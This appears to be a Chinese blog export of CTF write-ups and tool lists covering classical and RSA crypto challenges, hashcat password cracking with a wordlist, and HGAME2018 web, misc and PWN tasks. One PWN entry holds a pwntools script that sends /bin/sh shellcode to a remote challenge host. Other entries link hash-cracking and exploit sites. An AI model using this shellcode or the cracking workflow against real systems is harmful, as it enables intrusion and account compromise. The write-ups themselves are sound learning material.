123456789101112131415161718192021222324252627#include &lt;bits/stdc++.h&gt;using namespace std;int arr[14344391];vector&lt;string&gt; st;inline bool cmp(int a, int b)&#123; return st[a]&lt;st[b];&#125;int main()&#123; ios::sync_with_stdio(0); //加速输入输出用，其实为了效率应该考虑用scanf/printf + char*的组合，不过也能接受了 freopen("rawsha256.txt", "r", stdin); string a; int pos=0; while(cin&gt;&gt;a)&#123; st.push_back(a); arr[pos]=pos; ++pos; &#125; sort(arr,arr+14344391,cmp); cout&lt;&lt;arr[0]&lt;&lt;endl&lt;&lt;arr[14344390]&lt;&lt;endl; return 0;&#125;//2637658//9682632//--------------------------------//Process exited after 67.14 seconds with return value 0 然后找到对应单词测试一下就行 12345678&gt;&gt;&gt; import hashlib&gt;&gt;&gt; def hash(strings):... return str(hashlib.sha256(strings.encode()).hexdigest())...&gt;&gt;&gt; print(hash("yame1bore"))0000010e433cfc497373957df2ea9af41ec17edc43672c413558f62d09842190&gt;&gt;&gt; print(hash("bert7quinn,3"))fffffdaa4034dadd8b4cf8a18f92a230a92423ee24ad6dfb24adb758a8487ca2 Vigenère多表，工具即可 https://f00l.de/hacking/vigenere.php 成功 You already solved this one! Solution: BARLEY Monoalphabetic Cipher单表，工具解决 https://quipqiup.com/ 成功 You already solved this one! Solution: c21c7f2384dabd723c6d265b1315ddb5 Salt Alone Won&#39;t Save You暴力？字典暴力？ 是字典 先去hashcat了解了形式以后，写个脚本读 12345678910import base64, binasciif = open("crack.txt", "r")s = f.readlines()f.close()f = open("crack.txt", "w")for ss in s: ss = ss.split("$")[1:] ss[1] = ss[1][:-1] f.write(binascii.hexlify(base64.b64decode(ss[1])).decode('ascii')+':'+ss[0]+'\n')f.close() 然后上hashcat 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889A:\Downloads\Compressed\hashcat-4.1.0λ hashcat64.exe -m 1410 crack.txt rockyou.txthashcat (v4.1.0) starting...* Device #1: WARNING! Kernel exec timeout is not disabled. This may cause "CL_OUT_OF_RESOURCES" or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch* Device #2: Intel's OpenCL runtime (GPU only) is currently broken. We are waiting for updated OpenCL drivers from Intel. You can use --force to override, but do not report related errors.nvmlDeviceGetFanSpeed(): Not SupportedOpenCL Platform #1: NVIDIA Corporation======================================* Device #1: GeForce GTX 965M, 512/2048 MB allocatable, 8MCUOpenCL Platform #2: Intel(R) Corporation========================================* Device #2: Intel(R) HD Graphics 530, skipped.* Device #3: Intel(R) Core(TM) i7-6700HQ CPU @ 2.60GHz, skipped.Hashes: 7 digests; 7 unique digests, 7 unique saltsBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotatesRules: 1Applicable optimizers:* Zero-Byte* Early-Skip* Not-Iterated* Raw-HashMinimum password length supported by kernel: 0Maximum password length supported by kernel: 256Minimim salt length supported by kernel: 0Maximum salt length supported by kernel: 256ATTENTION! Pure (unoptimized) OpenCL kernels selected.This enables cracking passwords and salts &gt; length 32 but for the price of drastically reduced performance.If you want to switch to optimized OpenCL kernels, append -O to your commandline.Watchdog: Temperature abort trigger set to 90cDictionary cache built:* Filename..: rockyou.txt* Passwords.: 14344390* Bytes.....: 139921496* Keyspace..: 14344383* Runtime...: 1 sec0603ae874b416862ad705b1c42f770141b1c802fa960a5b5aa91430f04c94400:kPD)T)=~1K&#123;r:totoloco19906f2da1836ac6d7c40a93da4ca9afc56fdbe7279fcd12f479aa983d495772de73:4.9.mHSbiQ]^:phuck12397ddc547c46af1af9821475c0b629d6a47bbfeb952535cc0afff72022459548d:b*.m,%~&amp;&lt;"^6:nc27360e91ba9f0ff28267c4af7c6976bc1e119138b76fc2cf719a06b097baec8761391:(y3]&lt;+9zmi4|:imberly1999573fa001661fffc3c82aeec82f16951670dc342cc071eadc8bc71a8826209b66:&#123;4[1m"WqdR0s:cowmen7Cracking performance lower than expected?* Append -O to the commandline. This lowers the maximum supported password- and salt-length (typically down to 32).* Append -w 3 to the commandline. This can cause your screen to lag.* Update your OpenCL runtime / driver the right way: https://hashcat.net/faq/wrongdriver* Create more work items to make use of your parallelization power: https://hashcat.net/faq/moreworkApproaching final keyspace - workload adjusted.Session..........: hashcatStatus...........: ExhaustedHash.Type........: sha256($pass.$salt)Hash.Target......: crack.txtTime.Started.....: Fri May 11 15:37:43 2018 (5 secs)Time.Estimated...: Fri May 11 15:37:48 2018 (0 secs)Guess.Base.......: File (rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.Dev.#1.....: 11989.9 kH/s (9.69ms) @ Accel:128 Loops:1 Thr:384 Vec:1Recovered........: 5/7 (71.43%) Digests, 5/7 (71.43%) SaltsProgress.........: 100410681/100410681 (100.00%)Rejected.........: 0/100410681 (0.00%)Restore.Point....: 14344383/14344383 (100.00%)Candidates.#1....: $HEX[3032313342] -&gt; $HEX[042a0337c2a156616d6f732103]HWMon.Dev.#1.....: Temp: 63c Util: 50% Core:1151MHz Mem:2505MHz Bus:16Started: Fri May 11 15:37:31 2018Stopped: Fri May 11 15:37:48 2018 排序输入得到答案 CCA on Textbook RSARSA的选择密文攻击。 假设爱丽丝创建了密文 $C=P^emodn$并且把 $C$ 发送给鲍勃，同时假设我们要对爱丽丝加密后的任意密文解密，而不是只解密 $C$，那么我们可以拦截$ C$，并运用下列步骤求出 $P$： 选择任意的 $X∈Z^∗_n$，即 $X$ 与 $N$ 互素 计算 $Y=C×X^emod n$ 由于我们可以进行选择密文攻击，那么我们求得 $Y$ 对应的解密结果 $Z=Y^d$ 那么，由于 $Z=Y^d=(C×X^e)^d=C^dX=P^{ed}X=PXmodn$，由于 $X$ 与 $N$ 互素，我们很容易求得相应的逆元，进而可以得到 $P$ 于是先读公钥 123456789101112131415161718192021222324252627282930313233λ openssl rsa -pubin -in pubkey.pem -text -modulusPublic-Key: (2048 bit)Modulus: 00:a9:a9:60:8d:4b:d1:be:ee:e3:ce:11:51:cc:2d: 1a:72:b8:76:df:63:e4:9f:70:aa:c8:da:e5:04:f5: 91:7c:aa:f7:9f:5a:16:ae:5a:0b:8f:c2:e5:59:b6: 46:8f:b4:9b:64:8d:02:96:6e:a2:30:03:f2:08:d7: 56:b6:31:11:2d:86:ae:85:5e:04:82:e7:df:db:d5: e9:0d:06:d5:6b:58:12:36:db:9a:9b:d5:24:2f:2e: ca:82:b5:c2:f9:52:88:50:ad:be:78:b7:d1:83:e2: b1:ee:3b:2e:89:f2:45:33:9e:88:04:67:40:a0:d0: 50:49:f5:76:a3:7a:ca:a9:45:0c:51:c7:7c:f5:b5: ba:85:e5:72:39:c2:a0:55:8e:eb:a1:f0:e6:06:7a: d3:b9:c6:50:08:7b:6b:35:ea:72:eb:8a:c6:8c:00: 5d:4a:38:a4:c7:d8:d4:0c:b2:91:59:4a:83:21:ff: 6c:08:78:81:2a:65:9a:83:59:f7:67:65:cd:55:97: 15:96:ec:20:1a:30:63:8f:39:c5:23:08:5e:13:c7: 55:9d:07:22:44:ea:70:df:84:f3:7b:a8:13:19:51: 76:fc:62:c7:58:63:78:38:3f:5a:52:93:b0:3f:54: 43:26:5d:f8:e7:50:5f:27:9f:e5:60:6d:36:bc:f1: 47:f9Exponent: 65537 (0x10001)Modulus=A9A9608D4BD1BEEEE3CE1151CC2D1A72B876DF63E49F70AAC8DAE504F5917CAAF79F5A16AE5A0B8FC2E559B6468FB49B648D02966EA23003F208D756B631112D86AE855E0482E7DFDBD5E90D06D56B581236DB9A9BD5242F2ECA82B5C2F9528850ADBE78B7D183E2B1EE3B2E89F245339E88046740A0D05049F576A37ACAA9450C51C77CF5B5BA85E57239C2A0558EEBA1F0E6067AD3B9C650087B6B35EA72EB8AC68C005D4A38A4C7D8D40CB291594A8321FF6C0878812A659A8359F76765CD55971596EC201A30638F39C523085E13C7559D072244EA70DF84F37BA813195176FC62C7586378383F5A5293B03F5443265DF8E7505F279FE5606D36BCF147F9writing RSA key-----BEGIN PUBLIC KEY-----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqalgjUvRvu7jzhFRzC0acrh232Pkn3CqyNrlBPWRfKr3n1oWrloLj8LlWbZGj7SbZI0Clm6iMAPyCNdWtjERLYauhV4Eguff29XpDQbVa1gSNtuam9UkLy7KgrXC+VKIUK2+eLfRg+Kx7jsuifJFM56IBGdAoNBQSfV2o3rKqUUMUcd89bW6heVyOcKgVY7rofDmBnrTucZQCHtrNepy64rGjABdSjikx9jUDLKRWUqDIf9sCHiBKmWag1n3Z2XNVZcVluwgGjBjjznFIwheE8dVnQciROpw34Tze6gTGVF2/GLHWGN4OD9aUpOwP1RDJl3451BfJ5/lYG02vPFH+QIDAQAB-----END PUBLIC KEY----- 123456789λ pythonPython 3.6.1 (v3.6.1:69c0db5, Mar 21 2017, 17:54:52) [MSC v.1900 32 bit (Intel)] on win32Type "help", "copyright", "credits" or "license" for more information.&gt;&gt;&gt; n =0xA9A9608D4BD1BEEEE3CE1151CC2D1A72B876DF63E49F70AAC8DAE504F5917CAAF79F5A16AE5A0B8FC2E559B6468FB49B648D02966EA23003F208D756B631112D86AE855E0482E7DFDBD5E90D06D56B581236DB9A9BD5242F2ECA82B5C2F9528850ADBE78B7D183E2B1EE3B2E89F245339E88046740A0D05049F576A37ACAA9450C51C77CF5B5BA85E57239C2A0558EEBA1F0E6067AD3B9C650087B6B35EA72EB8AC68C005D4A38A4C7D8D40CB291594A8321FF6C0878812A659A8359F76765CD55971596EC201A30638F39C523085E13C7559D072244EA70DF84F37BA813195176FC62C7586378383F5A5293B03F5443265DF8E7505F279FE5606D36BCF147F9&gt;&gt;&gt; x = 3&gt;&gt;&gt; c = 0x912fcd40a901aa4b7b60ec37ce6231bb87783b0bf36f824e51fe77e9580ce1adb5cf894410ff87684969795525a63e069ee962182f3ff876904193e5eb2f34b20cfa37ec7ae0e9391bec3e5aa657246bd80276c373798885e5a986649d27b9e04f1adf8e6218f3c805c341cb38092ab771677221f40b72b19c75ad312b6b95eafe2b2a30efe49eb0a5b19a75d0b31849535b717c41748a6edd921142cfa7efe692c9a776bb4ece811afbd5a1bbd82251b76e76088d91ed78bf328c6b608bbfd8cf1bdf388d4dfa4d4e034a54677a16e16521f7d0213a3500e91d6ad4ac294c7a01995e1128a5ac68bfc26304e13c60a6622c1bb6b54b57c8dcfa7651b81576fc&gt;&gt;&gt; d = pow(x,0x10001,n)*c%n&gt;&gt;&gt; hex(d)'0x5eff6db089a86b058bbfd34f01cbe256fc9cc5b18c0999bd215048f8ca3de6f3250191417e502ea15aac5c7cf167c9be60944361163b13b96b1262dfc4bcbd695a61dcedd74192d9bfc5c0b9c8399cba3f6e6fc9f4adaf6d65b0594c696a32ab53913c06be6de9ee68b030b0aaef65bec0cbec7ad2439057cf30f7cd083138f98be11e93e54168acbc4bacb6b87b0a4a3d84e761f58e7605a0ae01b72c1344e96d7c5401be91bbe78a3527672c073c4c355ee340a1d2ea5d178c31c40561bccfb9ef47e0c984bd8227a187f492489b0292b506edf992950c009b59d2093b43f5601affa6b5b0b39a4b848c654ad242c55e62b358c03d91f889e7ab5e5d7e7f02' 提到网站去，得到1395d5d50ae8d8e24572a393c628b3c4b335a30298b305d396e8b2a388e302d602a245d3c4e4a8e335990a88e5a302a5a30478de8244b36305690938b512d32 求$3^{-1}modn$，最后计算得到明文0x687474703a2f2f6172636869762e696e667365632e6574687a2e63682f656475636174696f6e2f667330382f73656373656d2f4d616e67657230312e706466 AES-CTR with Nonce Reuse就是Two-Time-Pad攻击咯 Bad Entropy就是爆破咯 123456789101112131415161718192021from hashlib import md5from Crypto.Cipher import AESimport binasciic = binascii.unhexlify("a99210d796a1e37503febf65c329c1b2")print(c)i = 1453651200while i &lt;= 1454169600: s = md5(str(i).encode()).hexdigest() s = binascii.unhexlify(s) cipher = AES.new(s, AES.MODE_ECB) try: cipher.decrypt(c).decode('ascii') print(cipher.decrypt(c)) a = input() if int(a) == 0: print(i) break except: pass i += 1 爆破成功，密钥时间是1453862488 Rainbow Table Hash Chain直觉告诉我hashcat可解 Elliptic Curve Private Key Recovery貌似是公钥选得腊鸡？但是我需要复（yu）习一下ECC ECDSA Nonce Recovery同上 Double Strength Affine直觉告诉我，暴力依然可以解 Slightly harder passwordsTwitter上有hint，直觉告诉我说hashcat可以解决 Upgraded Affine这个的CBC需要考虑一下子了 Fvtavat Xrl Erpbirel印象里是RSA，慢慢来把 Insufficient Key Size这题这么水还放这么后面……yafu/factordb秒解好吧 都懒得写WP了……看到这里还不会的可以退群了（明示【误 Håstad&#39;s Broadcast AttackRSA广播攻击诶，好嗦 CBC Padding Attack标题明示，我要慢慢学习去 Breaking PDF PasswordsVigenère + Rail Fence手动一个个试，然后得到密钥是21，trader Recover the secret phone number这题还是比较有意思的 首先很明显是一个base64 12345678λ pythonPython 3.6.1 (v3.6.1:69c0db5, Mar 21 2017, 17:54:52) [MSC v.1900 32 bit (Intel)] on win32Type "help", "copyright", "credits" or "license" for more information.&gt;&gt;&gt; a = "H4sIAIq6o1cAAy2QS5OiMBSF9/yaIDrVLnrRQfJS000gAbILhCJAUMryMfrrB6tndRf3u+ecexR2nuLQNxF3eiU7u0IvitWtitimIcLrGEamFGdKxNmUx64hqq+xHyi++jZbd3JSQx1p3/QQBAbLBWCznRDQGbzocuws/ug0VkNz8g8br/fxKO51b8Ei+GwzCOon7JuTevNTHbFhmcBg/woo3t704qCWhM0kT80TurqHvir5rEv6TrpZmNDG7wP1fLNFsQ0p5m9uMsVmpNiDQ3feB4cMXA9ZGAtpWd7DVEl2zOSxy4DSvzuwz6WLLBCikPOhDmdmiB7yEQkhWSwlSqrSwsUUBtnkYF4yYxJdfOPHJc2VaPF2rkox1IPjlVep9VAJoJzuZtJOi8aKsQa7hEdfF0H4VO/4TxbZW6B2ycbsPMyIpy2+Si7/mpzwtUX6zndfoRmT1/4FYROKix05q4mjQvE/sbdeK9cLUN3b0X3LhIWBJLBKw5kuL5CjfDyKUnkl5cYixESCRCrp/n8VKB/TTiIV54nf0eSKit8arnH3+Rn8A9M9NCIXAgAA"&gt;&gt;&gt; import base64&gt;&gt;&gt; f = open("file","wb")&gt;&gt;&gt; f.write(base64.b64decode(a))429 然后去鉴定去 12345root@kali:~# binwalk fileDECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 gzip compressed data, from Unix, last modified: 2016-08-04 21:58:34 接着解压 1root@kali:~# gzip -d file 接着又是很明显的base64，解出来是个公钥 去分解一下，成功了 求得私钥解出号码 Optimal Backpack AllocationInsecure PRNGPlayfairCRIMEs against TLSBleichenbacher&#39;s CCA2 on RSABackdoored PRNGNot So Safe PrimesDSA with LCG nonces]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安装式工具集合]]></title>
    <url>%2F%E5%AE%89%E8%A3%85%E5%BC%8F%E5%B7%A5%E5%85%B7%E9%9B%86%E5%90%88%2F</url>
    <content type="text"><![CDATA[持续更新ing 可能以后还会重新整理 英语工具http://www.1checker.com/Products/DownLoad http://www.gingersoftware.com/zh/download]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Software</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[逆向工程核心原理学习笔记（一）]]></title>
    <url>%2F%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[HGAME2018-week2部分WP]]></title>
    <url>%2FHGAME2018-week2%E9%83%A8%E5%88%86WP%2F</url>
    <content type="text"><![CDATA[菜鸟每天飞过 ，报告一下做题进度- Web - [x] Random? - [x] 草莓社区-1 - [x] 草莓社区-2 - [ ] XSS-1 - [ ] XSS-2 - [ ] 最简单的sql题- Rev - [ ] wtfitis - [ ] miaomiaowu - [ ] iccanobif- PWN - [x] ez_shellcode - [x] ez bash jail - [ ] hacker_system_ver1 - [ ] ez_shellcode_ver2- Misc - [x] 咻咻咻 - [x] White cosmos - [x] easy password - [x] mysterious file header- Crypto - [x] easy rsa - [x] the same simple RSA - [ ] xasr - [x] Caesar&amp;&amp;Caesar - [x] violence所以我到底是啥呢？想了想，应该是Web瞎做，Bin乱搞，其他RP选手……# Web## Random?首先都提示了vim改代码，那就是源码泄露咯试了一下是 用vim读一下 这里的方法是构造一个对象使public和secret公用空间，方法是 草莓社区-1LFI嘛，最简单的肯定是直接来咯 草莓社区-2难一点的就用base64编码读咯 PWNez_shellcode既然是直接执行，那找一个就好了 123456from pwn import *r = remote("111.230.149.72",10004)print r.recvpayload = "\x6a\x0b"+"\x58"+"\x99"+"\x52"+"\x68\x2f\x2f\x73\x68"+"\x68\x2f\x62\x69\x6e"+"\x89\xe3"+"\x52" +"\x53"+"\x89\xe1"+"\xcd\x80"r.send(payload)r.interactive() ez bash jail根据视频教程 Misc咻咻咻首先是一个zip伪加密 解压出来以后按照https://ethackal.github.io/2015/10/05/derbycon-ctf-wav-steganography/用Ruby来解码 明显是Base64，解码得flag White cosmosPWNHUB密码学专场里的签到题的套路 打开一看0x09/0x20心里就有底了 因为可见字符首位应该是0，所以0x09对应0，0x20对应1 easy password没什么好说的，跑就是了 mysterious file header首先是zip包把前四字节做了一下调整，还是比较明显的，改正常以后解压就行 解压出来的文件拿反编译器http://www.javadecompilers.com/搞一下 有用的代码为 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354/* * Decompiled with CFR 0_123. */package GUI;import java.awt.Component;import java.awt.GridLayout;import java.awt.LayoutManager;import java.awt.event.ActionEvent;import java.awt.event.ActionListener;import javax.swing.JButton;import javax.swing.JFrame;import javax.swing.JPanel;import javax.swing.JTextArea;public class hgameGUI extends JFrame &#123; private static final int DEFAULT_WIDTH = 300; private static final int DEFAULT_HEIGHT = 200; public hgameGUI() &#123; super("Welcome to Hgame!"); this.setSize(300, 200); JButton flag1 = new JButton("i'm flag"); JButton flag2 = new JButton("i'm flag, too."); JButton flag3 = new JButton("RU kidding me? I'm the true flag!"); JButton flag4 = new JButton("UR wrong, I'm the true flag!"); JTextArea flagtext = new JTextArea("Want flag? Try upstairs."); JPanel flag = new JPanel(); flag.setLayout(new GridLayout(5, 1)); flag.add(flag1); flag.add(flag2); flag.add(flag3); flag.add(flag4); flag.add(flagtext); flag1.addActionListener(event -&gt; &#123; flagtext.setText("118"); &#125; ); flag2.addActionListener(event -&gt; &#123; flagtext.setText("54"); &#125; ); flag3.addActionListener(event -&gt; &#123; flagtext.setText("29"); &#125; ); flag4.addActionListener(event -&gt; &#123; flagtext.setText("89"); &#125; ); this.add(flag); &#125;&#125; 智障的我反应了半天才明白这是IP地址 遍历一下顺序查一下，在中国的一个IP里找到 Cryptoeasy rsa明明还是偶尔摸摸ACM的，二分都想不起来……MDZZ 123456789101112131415161718N = 10385112853503545283534594498014002163302819192542881359629016178651814593394538223939733674125477453748418677846543570433509186453439897628509042367641638605796280506469598857872127102183624493512082415420093824666579257184064851925863532407038708153173813845163607930388067232852387553655027755138043051251085946275767001373277444643651026212284925970808939348126454571156523402419571304104957238600724334148041629955456548891850609245486162713434748801968838458008730625275388077430783612116161245037630984479400721315318755404657093206825883572149393481806067157147431981573823960963614146686202457034323040706001e = 65537c = 4371976065894333890314975885075127128451240983808800709698046359245834252220415066013588488225793488033803390795656718853587692177687489853479502247266771924035749805299269602527272036788769904108885493823764984982805025952459173246366939243972669582338728034363614943062106220697944193226897767645789368465460202024200438535770983989035642434091720020123447189714932941203953201421143816856602410516207702904806903435163191348277867475813985765685033173827201970396908439360218409562692753257235084893548449865848486681931258855329384534422245333790248671083002562017871712806386748477524316776702973435067495735891h = 211473031829143387075248424832701297198713292770838284307849674781204968609248808096119074157099909881957829793545784295167214864644080464847006389628006758327477845870101535232054809595189429534377867001767649036319119343001102771623484473596258682675319189568166030200094562890253995876322745344347924616750low = 1high = h//2 mid =int((low+high))//2while low&lt;high: if low*(h-low) &gt; N: high = mid-1 else: low = mid + 1 mid = (low+high)//2print(low)print(h-low) 这样就有p/q了 后来发现这出题人一开始应该没这样想 回头补…… The same simple RSA先读一下key咯 12345678910111213$ openssl rsa -pubin -in pubkey.pem -text -modulusPublic-Key: (256 bit)Modulus: 00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f: 1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f: be:30:ddExponent: 65537 (0x10001)Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD-----BEGIN PUBLIC KEY-----MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDryigb/+l/vjDdAgMBAAE=-----END PUBLIC KEY-----writing RSA key 256位嘛，好说了 然后用rsatool生成pem文件，解密得flag 需要注意的是有了q/p也不能直接解密，这是使用了openssl的缘故（具体的我还没了解过 Caesar&amp;&amp;Caesar直接在线解咯 要分析的话，就是指数重叠+频率分析？ violence123456a = "191709050607090519_0706_0603150519_03_0a0706_170c_1407170205101105"a = a.replace('_','')str = ""for i in range(0,int(len(a)/2)): str+=chr(ord('a')+int(a[2*i]+a[2*i+1],16))print(str) 123456from pycipher import Affines = [1,3,5,7,9,11,15,17,19,21,23,25]for i in s: for j in range(0,25): print(Affine(a=i,b=j).encipher('zxjfghjfzhggdvfzdkhgxmuhxcfqrf').lower()) 然后找到]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
        <tag>Misc</tag>
        <tag>PWN</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PWN学习记录]]></title>
    <url>%2FPWN%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[学习PWN的记录 可能会有路线，看填坑进度…… 环境配置按理说第一篇是要说一下这个 我是Kali 2.0，所以就按照如下指令输进去就行了 123456789dpkg --add-architecture i386 apt-get updateapt-get -f dist-upgrade apt-get install lib32c-dev lib32stdc++6 libc6:i386 gcc-multilibapt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essentialpip install pwntoolsgit clone https://github.com/pwndbg/pwndbg /opt/pwndbgcd /opt/pwndbg./setup.sh 学习记录及WP地址 Exploit-Exercise Nebula Protostar（解析还没写XD） Fusion Main Sequence Main Sequence Story line Setup instructions Irate Manticore Touchy Owl Wild Amphibian Storming Bear Screaming Jesus Fabled Scorpion Selfish Dragonfly Vicious Platypus CTF HGAME2018 week1 guess_number flag_server zazahui week2 ez_shellcode ez bash jail hacker_system_ver1 ez_shellcode_ver2 To be continue...]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[轻工具个人集合]]></title>
    <url>%2F%E8%BD%BB%E5%B7%A5%E5%85%B7%E4%B8%AA%E4%BA%BA%E9%9B%86%E5%90%88%2F</url>
    <content type="text"><![CDATA[持续更新ing 可能以后还会重新整理 cpp在线沙盒编译器https://wandbox.org/ cpp生成汇编代码https://godbolt.org/ Web在线写项目https://stackblitz.com/ 数据结构/算法可视化https://visualgo.net/zh http://algo-visualizer.jasonpark.me/#path=backtracking/n_queens/n_queens http://www.cs.usfca.edu/~galles/visualization/Algorithms.html 一个工具集http://tool.yovisun.com/ 学术期刊影响因子及分类分区目录 2014年分区表 2012年分区表 2011年分类目录 材料学院2012年国际一流期刊 SCI-Hub可用网址链接 智能快递查询 在线视频智能解析下载 计量单位换算器 长度计量单位换算器 重量计量单位换算器 WordCounter 英文论文单词统计 HTML/JavaScript格式化及加密压缩工具 BBeJSON 工具 英文单词大小写转换 RGB颜色在线拾取与转换 JSON代码格式化及着色工具 数字转换成大写金额 未来一小时天气精准查询 经纬度查询两点距离 在线分解质因子http://factordb.com OEIS数列查找http://oeis.org/ 时光机器https://web.archive.org/ 书籍、论文下载http://gen.lib.rus.ec/ https://libgen.pw/ http://readfree.me/ http://www.kindle178.com/ http://mebook.cc/?s=%E7%A8%8B%E5%BA%8F http://cn.epubee.com/books/ http://www.books-share.com/ http://en.booksee.org http://booksc.org https://sci-hub.tw/ http://bestcbooks.com/ 软件破解http://astalavista.box.sk/]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>cpp</tag>
        <tag>software_development</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF轻工具个人集合]]></title>
    <url>%2FCTF%E8%BD%BB%E5%B7%A5%E5%85%B7%E4%B8%AA%E4%BA%BA%E9%9B%86%E5%90%88%2F</url>
    <content type="text"><![CDATA[持续更新ing 可能以后还会重新整理 古典密码学工具在线解密http://www.practicalcryptography.com/ciphers/ 直链列表： Atbash Cipher ROT13 Cipher Caesar Cipher Affine Cipher Rail-fence Cipher Baconian Cipher Polybius Square Cipher Simple Substitution Cipher Codes and Nomenclators Cipher Columnar Transposition Cipher Autokey Cipher Beaufort Cipher Porta Cipher Running Key Cipher Vigenère and Gronsfeld Cipher Homophonic Substitution Cipher Four-Square Cipher Hill Cipher Playfair Cipher ADFGVX Cipher ADFGX Cipher Bifid Cipher Straddle Checkerboard Cipher Trifid Cipher Fractionated Morse Cipher Enigma Cipher Lorenz Cipher 另一个网站： WordCounter 英文论文单词统计 另一个维吉尼亚：https://atomcated.github.io/Vigenere/ 另一个维吉尼亚：http://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx 另一个维吉尼亚：https://f00l.de/hacking/vigenere.php 文字加密解密： http://www.qqxiuzi.cn/bianma/wenbenjiami.php 单表替换：https://quipqiup.com/ 库pycipher 数论计算器https://www.alpertron.com.ar/CALTORS.HTM Brainfuckhttp://esoteric.sange.fi/brainfuck/impl/interp/i.html PWN-cheatsheethttps://github.com/Naetw/CTF-pwn-tips PHP代码在线执行http://sandbox.onlinephpfunctions.com/ 在线扫码https://online-barcode-reader.inliteresearch.com/ MD5破解https://somd5.com/ http://www.md5online.org/ HASH破解https://www.onlinehashcrack.com/ https://crackstation.net/ 在线OCRhttp://jinapdf.com/cn/image-to-text-file.php http://ocr.wdku.net/ base家族自动解123456789101112131415161718192021222324252627282930313233343536373839404142# -*- coding: utf-8 -*-# Python3# AutoBase.pyfrom base64 import *s = input()lis1 = [s]lis2 = []lis3 = []lis4 = []while(1): for a in lis1: ok = 0 try: lis2.append(b64decode(a).decode('ascii')) ok = 1 except: pass try: lis2.append(b32decode(a).decode('ascii')) ok = 1 except: pass try: lis2.append(b16decode(a).decode('ascii')) ok = 1 except: pass if not ok: lis3.append(a) if not len(lis2): break lis1=lis2.copy() lis2.clear()for a in range(0,len(lis3)): ok = 1 for b in lis3[a]: if ord(b)&gt;126 or ord(b)&lt;32: ok = 0 break if ok: lis4.append(lis3[a])print(lis4) 漏洞平台http://www.cnnvd.org.cn/ http://www.cnvd.org.cn/ http://exploit-db.com http://www.exploit-id.com/ http://cve.mitre.org/ http://www.securiteam.com/ http://securityvulns.com/ (更新至2015.02.11) http://securityvulns.ru/ http://www.securityfocus.com/ http://marc.info/?l=bugtraq http://www.securitytracker.com/ https://packetstormsecurity.com/ 题目https://ctftime.org/ http://shell-storm.org/repo/ https://www.jarvisoj.com/ http://oj.xctf.org.cn/web/login/?next=/ http://www.shiyanbar.com/ctf/practice http://ctf.nuptsast.com/ https://cgctf.nuptsast.com https://skidophrenia.ctfd.io/ https://www.ichunqiu.com/battalion http://cxsecurity.com/exploit/ http://reversing.kr/ http://pwnable.kr/ http://codeengn.com/challenges/ https://exploit-exercises.com/ https://io.netgarage.org/ http://hackinglab.cn/ http://captf.com/ http://www.baimaoxueyuan.com/ctf http://hkyx.myhack58.com/index.html http://overthewire.org/wargames/krypton/ https://backdoor.sdslabs.co/ http://www.hetianlab.com/CTFrace.html http://security.cs.rpi.edu/courses/binexp-spring2015/ http://www.wechall.net/challs http://smashthestack.org/wargames.html https://microcorruption.com/login https://www.hackthissite.org/pages/index/index.php https://exploit-exercises.com/protostar/ http://ctf.bugku.com/challenges https://id0-rsa.pub/]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HGAME2018-week1WP]]></title>
    <url>%2FHGAME2018-week1WP%2F</url>
    <content type="text"><![CDATA[第一周难度还是挺温柔，居然让我AK了，好开心呀 对了，这篇是先在本地生成的，周日才传上博客的。 WebAre you from Europe?第一次做这种题，还学到了一点浏览器console的用法……直接看源码，最开始发现在F12的console里输入quartz +=100000000有用然后很开心地抽卡，抽了半天感觉不对，仔细看了下概率……淦哦我是不是傻 翻到最底下有个函数，看着就是和flag有关的样子代码美化一哈 special number源码已经放了出来123456789101112131415include_once("flag.php");if(isset($_GET['key']))&#123; $pattern = '/^(?=.*[0-9].*)(?=.*[a-zA-Z].*).&#123;7,&#125;$/ '; $key = $_GET['key']; if(preg_match($pattern,$key)===0)&#123; echo "格式错误"; &#125;else&#123; $lock="******************"; $b = json_decode($key); if($b==$lock) echo $flag; else echo "this is no special number"; &#125;&#125; 